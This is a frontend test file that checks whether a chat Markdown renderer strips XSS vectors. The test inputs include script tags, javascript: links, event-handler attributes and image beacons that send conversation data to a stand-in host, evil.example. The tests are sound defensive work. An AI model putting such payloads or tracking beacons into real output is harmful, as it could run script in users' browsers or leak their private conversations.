import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { MessageResponse } from "@/components/ai-elements/message";

describe("chat Markdown security with the real renderer", () => {
  it("strips executable HTML and dangerous links", () => {
    render(<MessageResponse disallowedElements={["img"]}>{`<script>alert(1)</script>
<iframe src="https://evil.example"></iframe>
<a href="javascript:alert(1)" onclick="alert(1)">unsafe link</a>
<p onmouseover="alert(1)">Japan context</p>

[safe source](https://example.com/source)`}</MessageResponse>);
    expect(document.querySelector("script, iframe, [onclick], [onmouseover], [href^='javascript:']")).toBeNull();
    // Streamdown's default link-safety UI asks for confirmation before navigation.
    expect(screen.getByRole("button", { name: "safe source" })).toBeInTheDocument();
    expect(screen.getByText("Japan context")).toBeInTheDocument();
  });
  it("removes Markdown and HTML remote image beacons", () => {
    render(<MessageResponse disallowedElements={["img"]}>{`Japan

![tracking](https://evil.example/pixel?conversation=private)

<img src="https://evil.example/pixel" onerror="alert(1)">`}</MessageResponse>);
    expect(document.querySelector("img")).toBeNull();
    expect(document.body.innerHTML).not.toContain("evil.example");
  });
});
